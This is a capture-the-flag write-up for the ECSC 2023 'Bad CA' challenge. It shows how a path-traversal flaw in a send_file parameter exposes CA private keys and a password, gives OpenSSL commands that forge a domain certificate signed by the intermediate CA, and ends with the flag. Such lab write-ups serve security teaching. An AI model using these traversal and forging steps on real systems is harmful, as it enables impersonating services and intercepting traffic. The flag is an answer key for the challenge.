# Bad CA

> The corporate has set up their new fancy CA with ACME protocol. We use it to automatically issue certificates for all our internal services. Moreover, every employee was requested to install our new cool Root CA certificate.
>
> https://bad-ca.ecsc23.hack.cert.pl/
>
> It's just running for a few months and we have noticed that something extremely strange is going on. Somebody has obtained the correct certificate for example.com o_O. Just look:
>
> ```
> -----BEGIN CERTIFICATE-----
> MIICvzCCAmagAwIBAgIQQl2WzzfbdH4l/ORkR1pFIDAKBggqhkjOPQQDAjBKMRsw
> GQYDVQQKExJFQ1NDMjAyMyBDb3Jwb3JhdGUxKzApBgNVBAMTIkVDU0MyMDIzIENv
> cnBvcmF0ZSBJbnRlcm1lZGlhdGUgQ0EwHhcNMjMwNTIxMTcwMzU4WhcNMjMwNTIy
> MTcwNDU4WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx7l+eraX
> 9pa46w+GdaLkWG9s50DKnC9+TbFHNuRGbLEJ01piEKcXJMd7qjtiLn8Luwn1A2q+
> C9rjzZnkElnTUG7lb+2XIKCpuEBpR9C1ikHRwTeYiBm7GYBFKbI3roTIZHi6K3hc
> TnLNOi1WIOYXyXHQd4CVey3W7AVb78JogC0ybl+WRAEoDEiEGJ2DFKB8uif2NBZb
> F4xGLSznUQIsb095XMwSLNLim2CCE/8Xci4Ae1J44iCd9Ce6q8JMfblUHC/qFjnx
> I7JRr6cLc4756NkMyVUIyx6OtMqGbR8QwNIbyaophE8vv5JRati9f47egKc1Nwud
> KvwD22jHaed4ywIDAQABo4GsMIGpMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAU
> BggrBgEFBQcDAQYIKwYBBQUHAwIwHQYDVR0OBBYEFDP0YcYTWi4lkIkexHGRmpeq
> +I+FMB8GA1UdIwQYMBaAFEyFcN3kt89/sm7b38UQaL3ry1jlMBkGA1UdEQEB/wQP
> MA2CC2V4YW1wbGUuY29tMB0GDCsGAQQBgqRkxihAAQQNMAsCAQYEBGFjbWUEADAK
> BggqhkjOPQQDAgNHADBEAiAZgKVVx7+AhpUezE2Frjs76pJ8ndUAQ5ZdxpLl6OUh
> oAIgOboWrx5IqP4YlQo39eSgWMOcfoK51j56cjmL2ZKmEyo=
> -----END CERTIFICATE-----
> ```
>
> This certificate is indeed correctly signed by our intermediate CA :(. Which is even worse, it's that we have checked the CA software logs and this issuance is indeed there! It seems like somebody has just started the http-01 challenge for example.com and it went through succesfully.
>
> Now I'm seriously confused. Could you try to get another certificate for <your_nickname>.example.com and paste it to the "Certificate Checker"? It's going to let me know automatically.

## LFI on the website
The website contains a redirect to `https://bad-ca.ecsc23.hack.cert.pl/send_file?path=certs` from where `root_ca.crt` and `intermediate_ca.crt` can be downloaded. However, `path` parameter is susceptible to LFI attack and can be used to list files with paths relative to web app's working directory. Eventually, path `../step/secrets` containing certificates' keys and password (`intermediate_ca_key`, `root_ca_key`, `password`) can be found.

## Creating and signing the certificate
Given the keys and password with which they are protected, it's possible to easily forge a signed certificate with any domain using OpenSSL. First, create `domain.ext` file with the following contents to set X509v3 Subject Alternative Name field:
```
subjectAltName = @alt_names

[alt_names]
DNS.1 = lodsb.example.com
```
Then:
```
$ openssl genrsa -out lodsb.example.com.key 2048
$ openssl req -new -sha256 -key lodsb.example.com.key -subj "/C=PL/ST=MP/O=FooBar, Inc./CN=lodsb.example.com" -out lodsb.example.com.csr
$ openssl x509 -req -in lodsb.example.com.csr -CA intermediate_ca.crt -CAkey intermediate_ca_key -CAcreateserial -out lodsb.example.com.crt -days 1337 -sha256 -extfile domain.ext
Certificate request self-signature ok
subject=C = PL, ST = MP, O = "FooBar, Inc.", CN = lodsb.example.com
Enter pass phrase for intermediate_ca_key:
$
```
Finally, copy contents of `lodsb.example.com.crt` into the checker on the website to reveal the flag.

## Flag
`ecsc23{this_dns_validation_doesnt_seem_about_right}`

## Footnote
_"Only sure things in life are death, taxes, and unintended solutions."_